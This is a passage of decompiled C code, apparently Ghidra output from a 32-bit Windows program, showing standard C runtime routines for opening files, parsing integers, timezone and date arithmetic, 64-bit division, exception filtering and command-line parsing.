        return 0xffffffff;
      }
    }
    local_c = 1;
  }
LAB_0041aa60:
  uVar2 = 0x80;
  if (((param_2 & 0x100) != 0) && ((~DAT_0042519c & param_4 & 0x80) == 0)) {
    uVar2 = 1;
  }
  if ((param_2 & 0x40) != 0) {
    uVar2 = uVar2 | 0x4000000;
    local_10 = CONCAT13(local_10._3_1_,0x10000);
  }
  if ((param_2 & 0x1000) != 0) {
    uVar2 = uVar2 | 0x100;
  }
  if ((param_2 & 0x20) == 0) {
    if ((param_2 & 0x10) != 0) {
      uVar2 = uVar2 | 0x10000000;
    }
  }
  else {
    uVar2 = uVar2 | 0x8000000;
  }
  uVar3 = FUN_0041c1e5();
  if (uVar3 == 0xffffffff) {
    DAT_00425198 = 0;
    DAT_00425194 = 0x18;
  }
  else {
    hFile = CreateFileA(param_1,local_10,local_14,&local_20,local_c,uVar2,(HANDLE)0x0);
    if (hFile != (HANDLE)0xffffffff) {
      DVar4 = GetFileType(hFile);
      if (DVar4 != 0) {
        if (DVar4 == 2) {
          local_5 = local_5 | 0x40;
        }
        else if (DVar4 == 3) {
          local_5 = local_5 | 8;
        }
        FUN_0041c27a(uVar3,hFile);
        iVar6 = (uVar3 & 0x1f) * 8;
        param_1._3_1_ = local_5 & 0x48;
        *(byte *)((&DAT_00426700)[(int)uVar3 >> 5] + 4 + iVar6) = local_5 | 1;
        if ((((local_5 & 0x48) == 0) && ((local_5 & 0x80) != 0)) && ((param_2 & 2) != 0)) {
          local_14 = FUN_00417e5b(uVar3,-1,2);
          if (local_14 == 0xffffffff) {
            if (DAT_00425198 != 0x83) {
LAB_0041abc1:
              FUN_004174a4(uVar3);
              return 0xffffffff;
            }
          }
          else {
            param_3 = param_3 & 0xffffff;
            iVar5 = FUN_00417768(uVar3,(char *)((int)&param_3 + 3),(char *)0x1);
            if ((((iVar5 == 0) && (param_3._3_1_ == '\x1a')) &&
                (iVar5 = FUN_0041d577(uVar3,local_14), iVar5 == -1)) ||
               (DVar4 = FUN_00417e5b(uVar3,0,0), DVar4 == 0xffffffff)) goto LAB_0041abc1;
          }
        }
        if (param_1._3_1_ != 0) {
          return uVar3;
        }
        if ((param_2 & 8) != 0) {
          pbVar1 = (byte *)((&DAT_00426700)[(int)uVar3 >> 5] + 4 + iVar6);
          *pbVar1 = *pbVar1 | 0x20;
          return uVar3;
        }
        return uVar3;
      }
      CloseHandle(hFile);
    }
    DVar4 = GetLastError();
    FUN_0041a0e2(DVar4);
  }
  return 0xffffffff;
}



DWORD GetCurrentProcessId(void)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x0041abeb. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetCurrentProcessId();
  return DVar1;
}



void * __thiscall FUN_0041abf1(void *this,byte *param_1,byte **param_2,void *param_3,uint param_4)

{
  void *pvVar1;
  uint uVar2;
  void *pvVar3;
  uint uVar4;
  void *this_00;
  byte bVar5;
  undefined *puVar6;
  void *local_c;
  byte *local_8;
  
  local_c = (void *)0x0;
  bVar5 = *param_1;
  local_8 = param_1 + 1;
  while( true ) {
    if (DAT_00408e0c < 2) {
      uVar2 = (byte)PTR_DAT_00408c00[(uint)bVar5 * 2] & 8;
      this = PTR_DAT_00408c00;
    }
    else {
      puVar6 = (undefined *)0x8;
      uVar2 = FUN_0041b5b5(this,(uint)bVar5,8);
      this = puVar6;
    }
    if (uVar2 == 0) break;
    bVar5 = *local_8;
    local_8 = local_8 + 1;
  }
  if (bVar5 == 0x2d) {
    param_4 = param_4 | 2;
LAB_0041ac4c:
    bVar5 = *local_8;
    local_8 = local_8 + 1;
  }
  else if (bVar5 == 0x2b) goto LAB_0041ac4c;
  if ((((int)param_3 < 0) || (param_3 == (void *)0x1)) || (0x24 < (int)param_3)) {
    if (param_2 != (byte **)0x0) {
      *param_2 = param_1;
    }
    return (void *)0x0;
  }
  this_00 = (void *)0x10;
  if (param_3 == (void *)0x0) {
    if (bVar5 != 0x30) {
      param_3 = (void *)0xa;
      goto LAB_0041acb6;
    }
    if ((*local_8 != 0x78) && (*local_8 != 0x58)) {
      param_3 = (void *)0x8;
      goto LAB_0041acb6;
    }
    param_3 = (void *)0x10;
  }
  if (((param_3 == (void *)0x10) && (bVar5 == 0x30)) && ((*local_8 == 0x78 || (*local_8 == 0x58))))
  {
    bVar5 = local_8[1];
    local_8 = local_8 + 2;
  }
LAB_0041acb6:
  pvVar3 = (void *)(0xffffffff / ZEXT48(param_3));
  do {
    uVar2 = (uint)bVar5;
    if (DAT_00408e0c < 2) {
      uVar4 = (byte)PTR_DAT_00408c00[uVar2 * 2] & 4;
    }
    else {
      pvVar1 = (void *)0x4;
      uVar4 = FUN_0041b5b5(this_00,uVar2,4);
      this_00 = pvVar1;
    }
    if (uVar4 == 0) {
      if (DAT_00408e0c < 2) {
        uVar2 = *(ushort *)(PTR_DAT_00408c00 + uVar2 * 2) & 0x103;
      }
      else {
        pvVar1 = (void *)0x103;
        uVar2 = FUN_0041b5b5(this_00,uVar2,0x103);
        this_00 = pvVar1;
      }
      if (uVar2 == 0) {
LAB_0041ad62:
        local_8 = local_8 + -1;
        if ((param_4 & 8) == 0) {
          if (param_2 != (byte **)0x0) {
            local_8 = param_1;
          }
          local_c = (void *)0x0;
        }
        else if (((param_4 & 4) != 0) ||
                (((param_4 & 1) == 0 &&
                 ((((param_4 & 2) != 0 && ((void *)0x80000000 < local_c)) ||
                  (((param_4 & 2) == 0 && ((void *)0x7fffffff < local_c)))))))) {
          DAT_00425194 = 0x22;
          if ((param_4 & 1) == 0) {
            local_c = (void *)(((param_4 & 2) != 0) + 0x7fffffff);
          }
          else {
            local_c = (void *)0xffffffff;
          }
        }
        if (param_2 != (byte **)0x0) {
          *param_2 = local_8;
        }
        if ((param_4 & 2) == 0) {
          return local_c;
        }
        return (void *)-(int)local_c;
      }
      uVar2 = FUN_0041671e(this_00,(int)(char)bVar5);
      this_00 = (void *)(uVar2 - 0x37);
    }
    else {
      this_00 = (void *)((char)bVar5 + -0x30);
    }
    if (param_3 <= this_00) goto LAB_0041ad62;
    if ((local_c < pvVar3) ||
       ((local_c == pvVar3 && (this_00 <= (void *)(0xffffffff % ZEXT48(param_3)))))) {
      local_c = (void *)((int)local_c * (int)param_3 + (int)this_00);
      param_4 = param_4 | 8;
    }
    else {
      param_4 = param_4 | 0xc;
    }
    bVar5 = *local_8;
    local_8 = local_8 + 1;
  } while( true );
}



void __thiscall FUN_0041adf9(void *this,byte *param_1,byte **param_2,void *param_3)

{
  FUN_0041abf1(this,param_1,param_2,param_3,1);
  return;
}



void __cdecl FUN_0041ae10(byte *param_1,uint param_2)

{
  byte bVar1;
  ushort uVar2;
  byte *pbVar3;
  byte *pbVar4;
  byte bVar5;
  bool bVar6;
  
  pbVar3 = (byte *)0x0;
  if (DAT_004254bc == 0) {
    FUN_00415e60((char *)param_1,(char)param_2);
    return;
  }
  do {
    bVar5 = *param_1;
    if (((&DAT_004255c1)[bVar5] & 4) == 0) {
      bVar6 = param_2 == bVar5;
LAB_0041ae63:
      pbVar4 = param_1;
      if (bVar6) {
        pbVar3 = param_1;
      }
    }
    else {
      bVar1 = param_1[1];
      pbVar4 = param_1 + 1;
      if (bVar1 == 0) {
        bVar6 = pbVar3 == (byte *)0x0;
        param_1 = pbVar4;
        bVar5 = bVar1;
        goto LAB_0041ae63;
      }
      uVar2 = CONCAT11(bVar5,bVar1);
      bVar5 = bVar1;
      if (param_2 == uVar2) {
        pbVar3 = param_1;
      }
    }
    param_1 = pbVar4 + 1;
    if (bVar5 == 0) {
      return;
    }
  } while( true );
}



void FUN_0041ae70(void)

{
  if (DAT_00425330 == 0) {
    FUN_0041ae85();
    DAT_00425330 = DAT_00425330 + 1;
  }
  return;
}



void FUN_0041ae85(void)

{
  char cVar1;
  char cVar2;
  uint *puVar3;
  DWORD DVar4;
  int iVar5;
  char *pcVar6;
  void *this;
  uint *puVar7;
  int iStack_4;
  
  DAT_00425278 = 0;
  DAT_00408be8 = 0xffffffff;
  DAT_00408bd8 = 0xffffffff;
  puVar3 = (uint *)FUN_00415c0a((uint *)&DAT_00401370);
  if (puVar3 == (uint *)0x0) {
    DVar4 = GetTimeZoneInformation((LPTIME_ZONE_INFORMATION)&DAT_00425280);
    if (DVar4 == 0xffffffff) {
      return;
    }
    DAT_00408b40 = (void *)(DAT_00425280 * 0x3c);
    DAT_00425278 = 1;
    if (DAT_004252c6 != 0) {
      DAT_00408b40 = (void *)((int)DAT_00408b40 + DAT_004252d4 * 0x3c);
    }
    if ((DAT_0042531a == 0) || (DAT_00425328 == 0)) {
      DAT_00408b44 = 0;
      DAT_00408b48 = 0;
    }
    else {
      DAT_00408b44 = 1;
      DAT_00408b48 = (DAT_00425328 - DAT_004252d4) * 0x3c;
    }
    iVar5 = WideCharToMultiByte(DAT_00425260,0x220,(LPCWSTR)&DAT_00425284,-1,PTR_DAT_00408bcc,0x3f,
                                (LPCSTR)0x0,&iStack_4);
    if ((iVar5 == 0) || (iStack_4 != 0)) {
      *PTR_DAT_00408bcc = 0;
    }
    else {
      PTR_DAT_00408bcc[0x3f] = 0;
    }
    iVar5 = WideCharToMultiByte(DAT_00425260,0x220,(LPCWSTR)&DAT_004252d8,-1,PTR_DAT_00408bd0,0x3f,
                                (LPCSTR)0x0,&iStack_4);
    if ((iVar5 != 0) && (iStack_4 == 0)) {
      PTR_DAT_00408bd0[0x3f] = 0;
      return;
    }
  }
  else {
    if (*(char *)puVar3 == '\0') {
      return;
    }
    if ((DAT_0042532c != (uint *)0x0) &&
       (iVar5 = FUN_0041c760(puVar3,(byte *)DAT_0042532c), iVar5 == 0)) {
      return;
    }
    FUN_004150a9(DAT_0042532c);
    pcVar6 = FUN_004194b0(puVar3);
    DAT_0042532c = (uint *)FUN_00415216((uint *)(pcVar6 + 1));
    if (DAT_0042532c == (uint *)0x0) {
      return;
    }
    FUN_0041a1d0(DAT_0042532c,puVar3);
    FUN_0041d750((uint *)PTR_DAT_00408bcc,puVar3,3);
    puVar7 = (uint *)((int)puVar3 + 3);
    PTR_DAT_00408bcc[3] = 0;
    cVar2 = *(char *)puVar7;
    if (cVar2 == '-') {
      puVar7 = puVar3 + 1;
    }
    iVar5 = FUN_0041d6bd(this,(byte *)puVar7);
    DAT_00408b40 = (void *)(iVar5 * 0xe10);
    for (; (cVar1 = *(char *)puVar7, cVar1 == '+' || (('/' < cVar1 && (cVar1 < ':'))));
        puVar7 = (uint *)((int)puVar7 + 1)) {
    }
    if (*(char *)puVar7 == ':') {
      puVar7 = (uint *)((int)puVar7 + 1);
      iVar5 = FUN_0041d6bd(DAT_00408b40,(byte *)puVar7);
      DAT_00408b40 = (void *)((int)DAT_00408b40 + iVar5 * 0x3c);
      for (; ('/' < (char)*(byte *)puVar7 && ((char)*(byte *)puVar7 < ':'));
          puVar7 = (uint *)((int)puVar7 + 1)) {
      }
      if (*(byte *)puVar7 == 0x3a) {
        puVar7 = (uint *)((int)puVar7 + 1);
        iVar5 = FUN_0041d6bd(DAT_00408b40,(byte *)puVar7);
        DAT_00408b40 = (void *)((int)DAT_00408b40 + iVar5);
        for (; ('/' < (char)*(byte *)puVar7 && ((char)*(byte *)puVar7 < ':'));
            puVar7 = (uint *)((int)puVar7 + 1)) {
        }
      }
    }
    if (cVar2 == '-') {
      DAT_00408b40 = (void *)-(int)DAT_00408b40;
    }
    DAT_00408b44 = (int)*(char *)puVar7;
    if (DAT_00408b44 != 0) {
      FUN_0041d750((uint *)PTR_DAT_00408bd0,puVar7,3);
      PTR_DAT_00408bd0[3] = 0;
      return;
    }
  }
  *PTR_DAT_00408bd0 = 0;
  return;
}



bool __cdecl FUN_0041b0e3(int *param_1)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  
  if (DAT_00408b44 != 0) {
    uVar5 = param_1[5];
    if ((uVar5 != DAT_00408bd8) || (uVar5 != DAT_00408be8)) {
      if (DAT_00425278 == 0) {
        FUN_0041b28f(1,1,uVar5,4,1,0,0,2,0,0,0);
        FUN_0041b28f(0,1,param_1[5],10,5,0,0,2,0,0,0);
      }
      else {
        if (DAT_00425318 != 0) {
          uVar6 = (uint)DAT_0042531e;
          uVar3 = 0;
          uVar4 = 0;
        }
        else {
          uVar3 = (uint)DAT_0042531c;
          uVar6 = 0;
          uVar4 = (uint)DAT_0042531e;
        }
        FUN_0041b28f(1,(uint)(DAT_00425318 == 0),uVar5,(uint)DAT_0042531a,uVar4,uVar3,uVar6,
                     (uint)DAT_00425320,(uint)DAT_00425322,(uint)DAT_00425324,(uint)DAT_00425326);
        if (DAT_004252c4 != 0) {
          uVar6 = (uint)DAT_004252ca;
          uVar3 = 0;
          uVar4 = 0;
          uVar5 = param_1[5];
        }
        else {
          uVar3 = (uint)DAT_004252c8;
          uVar6 = 0;
          uVar4 = (uint)DAT_004252ca;
          uVar5 = param_1[5];
        }
        FUN_0041b28f(0,(uint)(DAT_004252c4 == 0),uVar5,(uint)DAT_004252c6,uVar4,uVar3,uVar6,
                     (uint)DAT_004252cc,(uint)DAT_004252ce,(uint)DAT_004252d0,(uint)DAT_004252d2);
      }
    }
    iVar1 = param_1[7];
    if (DAT_00408bdc < DAT_00408bec) {
      if ((DAT_00408bdc <= iVar1) && (iVar1 <= DAT_00408bec)) {
        if ((DAT_00408bdc < iVar1) && (iVar1 < DAT_00408bec)) {
          return true;
        }
LAB_0041b25b:
        iVar2 = ((param_1[2] * 0x3c + param_1[1]) * 0x3c + *param_1) * 1000;
        if (iVar1 == DAT_00408bdc) {
          return DAT_00408be0 <= iVar2;
        }
        return iVar2 < DAT_00408bf0;
      }
    }
    else {
      if (iVar1 < DAT_00408bec) {
        return true;
      }
      if (DAT_00408bdc < iVar1) {
        return true;
      }
      if ((iVar1 <= DAT_00408bec) || (DAT_00408bdc <= iVar1)) goto LAB_0041b25b;
    }
  }
  return false;
}



void __cdecl
FUN_0041b28f(int param_1,int param_2,uint param_3,int param_4,int param_5,int param_6,int param_7,
            int param_8,int param_9,int param_10,int param_11)

{
  int iVar1;
  int iVar2;
  
  if (param_2 == 1) {
    if ((param_3 & 3) == 0) {
      iVar1 = *(int *)(&DAT_00409048 + param_4 * 4);
    }
    else {
      iVar1 = *(int *)(&DAT_0040907c + param_4 * 4);
    }
    iVar2 = (int)(param_3 * 0x16d + -0x63db + iVar1 + 1 + ((int)(param_3 - 1) >> 2)) % 7;
    if (iVar2 < param_6) {
      iVar1 = iVar1 + -6 + (param_5 * 7 - iVar2) + param_6;
    }
    else {
      iVar1 = iVar1 + 1 + (param_5 * 7 - iVar2) + param_6;
    }
    if (param_5 == 5) {
      if ((param_3 & 3) == 0) {
        iVar2 = *(int *)(&DAT_0040904c + param_4 * 4);
      }
      else {
        iVar2 = (&DAT_00409080)[param_4];
      }
      if (iVar2 < iVar1) {
        iVar1 = iVar1 + -7;
      }
    }
  }
  else {
    if ((param_3 & 3) == 0) {
      iVar1 = *(int *)(&DAT_00409048 + param_4 * 4);
    }
    else {
      iVar1 = *(int *)(&DAT_0040907c + param_4 * 4);
    }
    iVar1 = iVar1 + param_7;
  }
  if (param_1 == 1) {
    DAT_00408bd8 = param_3;
    DAT_00408be0 = ((param_8 * 0x3c + param_9) * 0x3c + param_10) * 1000 + param_11;
    DAT_00408bdc = iVar1;
  }
  else {
    DAT_00408bf0 = ((param_8 * 0x3c + param_9) * 0x3c + DAT_00408b48 + param_10) * 1000 + param_11;
    if (DAT_00408bf0 < 0) {
      DAT_00408bf0 = DAT_00408bf0 + 86400000;
      DAT_00408bec = iVar1 + -1;
    }
    else {
      DAT_00408bec = iVar1;
      if (86399999 < DAT_00408bf0) {
        DAT_00408bf0 = DAT_00408bf0 + -86400000;
        DAT_00408bec = iVar1 + 1;
      }
    }
    DAT_00408be8 = param_3;
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined * __cdecl FUN_0041b3cf(int *param_1)

{
  int iVar1;
  bool bVar2;
  undefined *puVar3;
  int iVar4;
  int iVar5;
  int *piVar6;
  int *piVar7;
  
  bVar2 = false;
  iVar1 = *param_1;
  if (iVar1 < 0) {
    puVar3 = (undefined *)0x0;
  }
  else {
    iVar4 = iVar1 % 0x7861f80;
    iVar1 = (iVar1 / 0x7861f80) * 4;
    _DAT_0042534c = iVar1 + 0x46;
    iVar5 = iVar4;
    if (0x1e1337f < iVar4) {
      iVar5 = iVar4 + -0x1e13380;
      _DAT_0042534c = iVar1 + 0x47;
      if (0x1e1337f < iVar5) {
        iVar5 = iVar4 + -0x3c26700;
        _DAT_0042534c = iVar1 + 0x48;
        if (iVar5 < 0x1e28500) {
          bVar2 = true;
        }
        else {
          _DAT_0042534c = iVar1 + 0x49;
          iVar5 = iVar4 + -0x5a4ec00;
        }
      }
    }
    _DAT_00425354 = iVar5 / 0x15180;
    piVar6 = (int *)&DAT_0040904c;
    if (!bVar2) {
      piVar6 = &DAT_00409080;
    }
    _DAT_00425348 = 1;
    piVar7 = piVar6;
    while (piVar7 = piVar7 + 1, *piVar7 < _DAT_00425354) {
      _DAT_00425348 = _DAT_00425348 + 1;
    }
    _DAT_00425348 = _DAT_00425348 + -1;
    _DAT_00425344 = _DAT_00425354 - piVar6[_DAT_00425348];
    _DAT_00425350 = (*param_1 / 0x15180 + 4) % 7;
    _DAT_00425340 = (iVar5 % 0x15180) / 0xe10;
    _DAT_00425338 = (iVar5 % 0x15180) % 0xe10;
    _DAT_0042533c = _DAT_00425338 / 0x3c;
    _DAT_00425338 = _DAT_00425338 % 0x3c;
    _DAT_00425358 = 0;
    puVar3 = &DAT_00425338;
  }
  return puVar3;
}



undefined8 FUN_0041b4d0(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  
  uVar3 = param_1;
  uVar8 = param_4;
  uVar6 = param_2;
  uVar9 = param_3;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar5 = uVar8 >> 1;
      uVar9 = uVar9 >> 1 | (uint)((uVar8 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar8 = uVar5;
      uVar6 = uVar7;
    } while (uVar5 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar9;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar8 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar8)) ||
       ((param_2 <= uVar8 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  return CONCAT44(uVar3,iVar4);
}



undefined8 FUN_0041b540(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  int iVar6;
  int iVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  bool bVar11;
  
  uVar3 = param_1;
  uVar4 = param_4;
  uVar9 = param_2;
  uVar10 = param_3;
  if (param_4 == 0) {
    iVar6 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) %
                 (ulonglong)param_3);
    iVar7 = 0;
  }
  else {
    do {
      uVar5 = uVar4 >> 1;
      uVar10 = uVar10 >> 1 | (uint)((uVar4 & 1) != 0) << 0x1f;
      uVar8 = uVar9 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar9 & 1) != 0) << 0x1f;
      uVar4 = uVar5;
      uVar9 = uVar8;
    } while (uVar5 != 0);
    uVar1 = CONCAT44(uVar8,uVar3) / (ulonglong)uVar10;
    uVar3 = (int)uVar1 * param_4;
    lVar2 = (uVar1 & 0xffffffff) * (ulonglong)param_3;
    uVar9 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar4 = (uint)lVar2;
    uVar10 = uVar9 + uVar3;
    if (((CARRY4(uVar9,uVar3)) || (param_2 < uVar10)) || ((param_2 <= uVar10 && (param_1 < uVar4))))
    {
      bVar11 = uVar4 < param_3;
      uVar4 = uVar4 - param_3;
      uVar10 = (uVar10 - param_4) - (uint)bVar11;
    }
    iVar6 = -(uVar4 - param_1);
    iVar7 = -(uint)(uVar4 - param_1 != 0) - ((uVar10 - param_2) - (uint)(uVar4 < param_1));
  }
  return CONCAT44(iVar7,iVar6);
}



uint __thiscall FUN_0041b5b5(void *this,int param_1,uint param_2)

{
  BOOL BVar1;
  int iVar2;
  uint local_8;
  
  if (param_1 + 1U < 0x101) {
    param_1._2_2_ = *(ushort *)(PTR_DAT_00408c00 + param_1 * 2);
  }
  else {
    if ((PTR_DAT_00408c00[(param_1 >> 8 & 0xffU) * 2 + 1] & 0x80) == 0) {
      local_8 = CONCAT31((int3)((uint)this >> 8),(char)param_1) & 0xffff00ff;
      iVar2 = 1;
    }
    else {
      local_8._0_2_ = CONCAT11((char)param_1,(char)((uint)param_1 >> 8));
      local_8 = CONCAT22((short)((uint)this >> 0x10),(undefined2)local_8) & 0xff00ffff;
      iVar2 = 2;
    }
    BVar1 = FUN_0041d84e(1,(LPCSTR)&local_8,iVar2,(LPWORD)((int)&param_1 + 2),0,0,1);
    if (BVar1 == 0) {
      return 0;
    }
  }
  return param_1._2_2_ & param_2;
}



LONG __cdecl FUN_0041b62a(int param_1,_EXCEPTION_POINTERS *param_2)

{
  code *pcVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  int *piVar4;
  LONG LVar5;
  int iVar6;
  undefined4 *puVar7;
  
  piVar4 = FUN_0041b76b(param_1);
  uVar3 = DAT_0042535c;
  if ((piVar4 == (int *)0x0) || (pcVar1 = (code *)piVar4[2], pcVar1 == (code *)0x0)) {
    LVar5 = UnhandledExceptionFilter(param_2);
  }
  else if (pcVar1 == (code *)0x5) {
    piVar4[2] = 0;
    LVar5 = 1;
  }
  else {
    if (pcVar1 != (code *)0x1) {
      DAT_0042535c = param_2;
      if (piVar4[1] == 8) {
        if (DAT_00408e90 < DAT_00408e94 + DAT_00408e90) {
          iVar6 = (DAT_00408e94 + DAT_00408e90) - DAT_00408e90;
          puVar7 = (undefined4 *)(DAT_00408e90 * 0xc + 0x408e20);
          do {
            *puVar7 = 0;
            puVar7 = puVar7 + 3;
            iVar6 = iVar6 + -1;
          } while (iVar6 != 0);
        }
        uVar2 = DAT_00408e9c;
        iVar6 = *piVar4;
        if (iVar6 == -0x3fffff72) {
          DAT_00408e9c = 0x83;
        }
        else if (iVar6 == -0x3fffff70) {
          DAT_00408e9c = 0x81;
        }
        else if (iVar6 == -0x3fffff6f) {
          DAT_00408e9c = 0x84;
        }
        else if (iVar6 == -0x3fffff6d) {
          DAT_00408e9c = 0x85;
        }
        else if (iVar6 == -0x3fffff73) {
          DAT_00408e9c = 0x82;
        }
        else if (iVar6 == -0x3fffff71) {
          DAT_00408e9c = 0x86;
        }
        else if (iVar6 == -0x3fffff6e) {
          DAT_00408e9c = 0x8a;
        }
        (*pcVar1)(8,DAT_00408e9c);
        DAT_00408e9c = uVar2;
      }
      else {
        piVar4[2] = 0;
        (*pcVar1)(piVar4[1]);
      }
    }
    LVar5 = -1;
    DAT_0042535c = (_EXCEPTION_POINTERS *)uVar3;
  }
  return LVar5;
}



int * __cdecl FUN_0041b76b(int param_1)

{
  int *piVar1;
  
  piVar1 = &DAT_00408e18;
  if (DAT_00408e18 != param_1) {
    do {
      piVar1 = piVar1 + 3;
      if (&DAT_00408e18 + DAT_00408e98 * 3 <= piVar1) break;
    } while (*piVar1 != param_1);
  }
  if ((&DAT_00408e18 + DAT_00408e98 * 3 <= piVar1) || (*piVar1 != param_1)) {
    piVar1 = (int *)0x0;
  }
  return piVar1;
}



byte * FUN_0041b7ae(void)

{
  byte bVar1;
  int iVar2;
  byte *pbVar3;
  byte *pbVar4;
  
  if (DAT_00426828 == 0) {
    FUN_0041ce67();
  }
  bVar1 = *DAT_00426820;
  pbVar4 = DAT_00426820;
  if (bVar1 == 0x22) {
    while( true ) {
      pbVar3 = pbVar4;
      bVar1 = pbVar3[1];
      pbVar4 = pbVar3 + 1;
      if ((bVar1 == 0x22) || (bVar1 == 0)) break;
      iVar2 = FUN_0041d997(bVar1);
      if (iVar2 != 0) {
        pbVar4 = pbVar3 + 2;
      }
    }
    if (*pbVar4 == 0x22) goto LAB_0041b7eb;
  }
  else {
    while (0x20 < bVar1) {
      bVar1 = pbVar4[1];
      pbVar4 = pbVar4 + 1;
    }
  }
  for (; (*pbVar4 != 0 && (*pbVar4 < 0x21)); pbVar4 = pbVar4 + 1) {
LAB_0041b7eb:
  }
  return pbVar4;
}



void FUN_0041b806(void)

{
  char cVar1;
  char *pcVar2;
  uint **ppuVar3;
  uint *puVar4;
  int iVar5;
  uint *puVar6;
  
  if (DAT_00426828 == 0) {
    FUN_0041ce67();
  }
  iVar5 = 0;
  for (puVar6 = DAT_0042521c; *(char *)puVar6 != '\0'; puVar6 = (uint *)(pcVar2 + (int)puVar6 + 1))
  {
    if (*(char *)puVar6 != '=') {
      iVar5 = iVar5 + 1;
    }
    pcVar2 = FUN_004194b0(puVar6);
  }
  ppuVar3 = (uint **)FUN_00415216((uint *)(iVar5 * 4 + 4));
  DAT_004251bc = ppuVar3;
  if (ppuVar3 == (uint **)0x0) {
    FUN_004168e0(9);
  }
  cVar1 = *(char *)DAT_0042521c;
  puVar6 = DAT_0042521c;
  while (cVar1 != '\0') {
    pcVar2 = FUN_004194b0(puVar6);
    if (*(char *)puVar6 != '=') {
      puVar4 = (uint *)FUN_00415216((uint *)(pcVar2 + 1));
      *ppuVar3 = puVar4;
      if (puVar4 == (uint *)0x0) {
        FUN_004168e0(9);
      }
      FUN_0041a1d0(*ppuVar3,puVar6);
      ppuVar3 = ppuVar3 + 1;
    }
    puVar6 = (uint *)((int)puVar6 + (int)(pcVar2 + 1));
    cVar1 = *(char *)puVar6;
  }
  FUN_004150a9(DAT_0042521c);
  DAT_0042521c = (uint *)0x0;
  *ppuVar3 = (uint *)0x0;
  DAT_00426824 = 1;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0041b8bf(void)

{
  byte **ppbVar1;
  byte *pbVar2;
  int local_c;
  int local_8;
  
  if (DAT_00426828 == 0) {
    FUN_0041ce67();
  }
  GetModuleFileNameA((HMODULE)0x0,&DAT_00425360,0x104);
  DAT_004251cc = &DAT_00425360;
  pbVar2 = &DAT_00425360;
  if (*DAT_00426820 != 0) {
    pbVar2 = DAT_00426820;
  }
  FUN_0041b958(pbVar2,(byte **)0x0,(byte *)0x0,&local_8,&local_c);
  ppbVar1 = (byte **)FUN_00415216((uint *)(local_c + local_8 * 4));
  if (ppbVar1 == (byte **)0x0) {
    FUN_004168e0(8);
  }
  FUN_0041b958(pbVar2,ppbVar1,(byte *)(ppbVar1 + local_8),&local_8,&local_c);
  _DAT_004251b4 = ppbVar1;
  _DAT_004251b0 = local_8 + -1;
  return;
}



void __cdecl FUN_0041b958(byte *param_1,byte **param_2,byte *param_3,int *param_4,int *param_5)

{
  byte bVar1;
  bool bVar2;
  bool bVar3;
  byte *pbVar4;
  byte *pbVar5;
  uint uVar6;
  byte **ppbVar7;
  
  *param_5 = 0;
  *param_4 = 1;
  if (param_2 != (byte **)0x0) {
    *param_2 = param_3;
    param_2 = param_2 + 1;
  }
  if (*param_1 == 0x22) {
    while( true ) {
      bVar1 = param_1[1];
      pbVar4 = param_1 + 1;
      if ((bVar1 == 0x22) || (bVar1 == 0)) break;
      if ((((&DAT_004255c1)[bVar1] & 4) != 0) && (*param_5 = *param_5 + 1, param_3 != (byte *)0x0))
      {
        *param_3 = *pbVar4;
        param_3 = param_3 + 1;
        pbVar4 = param_1 + 2;
      }
      *param_5 = *param_5 + 1;
      param_1 = pbVar4;
      if (param_3 != (byte *)0x0) {
        *param_3 = *pbVar4;
        param_3 = param_3 + 1;
      }
    }
    *param_5 = *param_5 + 1;
    if (param_3 != (byte *)0x0) {
      *param_3 = 0;
      param_3 = param_3 + 1;
    }
    if (*pbVar4 == 0x22) {
      pbVar4 = param_1 + 2;
    }
  }
  else {
    do {
      *param_5 = *param_5 + 1;
      if (param_3 != (byte *)0x0) {
        *param_3 = *param_1;
        param_3 = param_3 + 1;
      }
      bVar1 = *param_1;
      pbVar4 = param_1 + 1;
      if (((&DAT_004255c1)[bVar1] & 4) != 0) {
        *param_5 = *param_5 + 1;
        if (param_3 != (byte *)0x0) {
          *param_3 = *pbVar4;
          param_3 = param_3 + 1;
        }
        pbVar4 = param_1 + 2;
      }
      if (bVar1 == 0x20) break;
      if (bVar1 == 0) goto LAB_0041ba03;
      param_1 = pbVar4;
    } while (bVar1 != 9);
    if (bVar1 == 0) {
LAB_0041ba03:
      pbVar4 = pbVar4 + -1;
    }
    else if (param_3 != (byte *)0x0) {
      param_3[-1] = 0;
    }
  }
  bVar2 = false;
  ppbVar7 = param_2;
  while (*pbVar4 != 0) {
    for (; (*pbVar4 == 0x20 || (*pbVar4 == 9)); pbVar4 = pbVar4 + 1) {
    }
    if (*pbVar4 == 0) break;
    if (ppbVar7 != (byte **)0x0) {
      *ppbVar7 = param_3;
      ppbVar7 = ppbVar7 + 1;
      param_2 = ppbVar7;
    }
    *param_4 = *param_4 + 1;
    while( true ) {
      bVar3 = true;
      uVar6 = 0;
